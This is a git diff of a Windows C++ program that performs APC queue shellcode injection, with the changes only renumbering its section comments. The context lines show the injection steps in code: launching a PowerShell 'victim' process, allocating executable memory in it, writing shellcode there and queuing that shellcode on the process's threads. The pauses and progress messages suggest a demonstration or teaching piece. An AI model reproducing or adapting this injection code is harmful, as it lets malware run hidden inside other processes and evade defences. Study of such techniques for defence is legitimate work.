@@ -53,7 +53,7 @@ int main() {
 	STARTUPINFOA si = { sizeof(si) };
 	PROCESS_INFORMATION pi;
 
-	// - SECTION 1: Start the victim process
+	// - Start the victim process
 	LPCSTR command = "powershell.exe -NoExit";  // Opens PowerShell and keeps it open
 
 	// Start the Powershell process
@@ -76,24 +76,24 @@ int main() {
 		return EXIT_FAILURE;
 	}
 
-	// - SECTION 2: Take Snapshot of the running Threads
+	// - SECTION 1: Take Snapshot of the running Threads
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
 
-	// - SECTION 3: Allocate memory space
+	// - SECTION 2: Allocate memory space
 	printf("%s Now, we will allocate the memory for our injection\n", k);
 	system("pause");
 	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	printf("%s allocated %zu-bytes with rwx permissions on address: 0x%p\n", k, sizeof(shellcode), shellAddress);
 	system("pause");
 
-	// - SECTION 4: Write Memory space
+	// - SECTION 3: Write Memory space
 	BOOL writeResult = WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);
 	if (!writeResult) {
 		printf("%s Failed to write shellcode. Error: %ld\n", e, GetLastError());
 		return EXIT_FAILURE;
 	}
 
-	// - SECTION 5: List the threads of the victim process
+	// - SECTION 4: List the threads of the victim process
 	if (Thread32First(snapshot, &threadEntry)) {
 		do {
 			if (threadEntry.th32OwnerProcessID == pi.dwProcessId) {
@@ -102,7 +102,7 @@ int main() {
 		} while (Thread32Next(snapshot, &threadEntry));
 	}
 
-	// - SECTION 6: Queue the shellcode in the threads APC queues for execution
+	// - SECTION 5: Queue the shellcode in the threads APC queues for execution
 	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
 	for (DWORD threadId : threadIds) {
 		printf("%s Queueing APC on the thread: %ld\n", k, threadId);
